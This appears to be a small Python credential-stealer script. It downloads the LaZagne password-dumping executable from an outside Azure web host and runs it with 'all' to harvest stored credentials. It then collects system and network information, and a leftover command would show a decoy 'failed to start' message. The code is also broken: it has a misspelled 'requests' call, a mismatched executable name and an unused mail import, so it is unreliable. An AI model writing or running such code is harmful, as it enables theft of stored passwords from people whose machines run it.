#!/usr/bin/env python

import smtplib
import subprocess
import re
import requests
import os


def download(url):
    get_response = requestes.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


download("http://mogiant.azurewebsites.net/laZagne_x64.exe")
result3 = subprocess.check_output("laZagne.exe all", shell=True)

command = "msg * failed to start"

command = "sysinfo"
result1 = subprocess.check_output(command, shell=True)

command = "ipconfig"
result2 = subprocess.check_output(command, shell=True)

print(result1, result2, result3)

lol = input("yeah>")
